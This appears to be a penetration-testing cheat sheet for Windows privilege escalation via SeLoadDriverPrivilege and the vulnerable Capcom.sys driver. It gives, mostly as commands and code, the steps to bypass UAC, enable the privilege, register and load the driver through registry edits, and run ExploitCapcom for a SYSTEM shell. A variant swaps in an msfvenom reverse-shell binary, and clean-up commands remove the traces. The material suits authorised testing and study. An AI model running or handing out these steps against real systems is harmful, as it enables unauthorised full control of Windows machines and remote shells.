- If SeLoadDriverPrivilege is invisible from an unelevated context, we will need to bypass UAC.

**UAC Bypasses
- https://github.com/hfiref0x/UACME


**Confirming Privileges
```
whoami /priv
```

**Enable SeLoadDriverPrivilege
https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp
```
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```
- Download it locally and edit it, pasting over the includes below

**Compile with cl.exe
```
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

**Add Reference to Driver
- https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
```
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

**Verify Driver is not loaded
- http://www.nirsoft.net/utils/driverview.html
```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

**Verify Privilege is Enabled
```
EnableSeLoadDriverPrivilege.exe
```

**Verify Capcom Driver is Listed
```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

**Use ExploitCapcom Tool to Escalate Privileges
- https://github.com/tandasat/ExploitCapcom
- Compile it with Visual Studio
```
.\ExploitCapcom.exe
```

## Alternate Exploitation - No GUI
- Modify ExploitCapcom.cpp code before compiling.
- Edit line 292 and replace "C:\\Windows\\system32\\cmd.exe" with a reverse shell binary created with msfvenom, for example: c:\ProgramData\revshell.exe
- TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
- Set up listender for payload, then execute ExploitCapcom.exe
```
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```


## Automating the Steps

**Automating with EopLoadDriver
- https://github.com/TarlogicSecurity/EoPLoadDriver/
```
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
- Run ExploitCapcom.exe to pop a SYSTEM shell

## Clean-up

**Removing Registry Key
```
reg delete HKCU\System\CurrentControlSet\Capcom
```

**Note: not exploitable after Windows 10 Version 1803
